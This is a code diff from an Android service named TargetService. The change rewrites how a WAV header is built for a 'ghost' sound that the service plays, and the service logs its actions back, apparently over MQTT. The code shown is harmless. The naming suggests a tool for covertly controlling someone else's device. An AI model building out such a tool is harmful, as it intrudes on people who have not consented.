@@ -20,6 +20,8 @@ import kotlinx.coroutines.*
 import org.eclipse.paho.client.mqttv3.*
 import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
 import java.io.*
+import java.nio.ByteBuffer
+import java.nio.ByteOrder
 import java.util.Locale
 import kotlin.coroutines.resume
 import kotlin.coroutines.suspendCoroutine
@@ -206,17 +208,27 @@ class TargetService : Service() {
             }
             val f = File(cacheDir, "ghost.wav")
             val fos = FileOutputStream(f)
-            val header = byteArrayOf(
-                82.toByte(), 73.toByte(), 70.toByte(), 70.toByte(), (36 + ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte(),
-                87.toByte(), 65.toByte(), 86.toByte(), 69.toByte(), 102.toByte(), 109.toByte(), 116.toByte(), 32.toByte(),
-                16.toByte(), 0.toByte(), 0.toByte(), 0.toByte(), 1.toByte(), 0.toByte(), 1.toByte(), 0.toByte(),
-                (sr and 0xff).toByte(), ((sr shr 8) and 0xff).toByte(), 0.toByte(), 0.toByte(), 0.toByte(), 0.toByte(),
-                2.toByte(), 0.toByte(), 16.toByte(), 0.toByte(), 100.toByte(), 97.toByte(), 116.toByte(), 97.toByte(),
-                (ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte()
-            )
-            fos.write(header)
+            
+            // Bikin WAV Header pake ByteBuffer (100% Aman)
+            val header = ByteBuffer.allocate(44).order(ByteOrder.LITTLE_ENDIAN)
+            header.put("RIFF".toByteArray())
+            header.putInt(36 + ns * 2)
+            header.put("WAVE".toByteArray())
+            header.put("fmt ".toByteArray())
+            header.putInt(16)
+            header.putShort(1)
+            header.putShort(1)
+            header.putInt(sr)
+            header.putInt(sr * 2)
+            header.putShort(2)
+            header.putShort(16)
+            header.put("data".toByteArray())
+            header.putInt(ns * 2)
+            
+            fos.write(header.array())
             fos.write(gs)
             fos.close()
+            
             mediaPlayer?.release()
             mediaPlayer = MediaPlayer().apply { setDataSource(f.absolutePath); prepare(); start() }
             sendLog("Ghost Sound Playing")
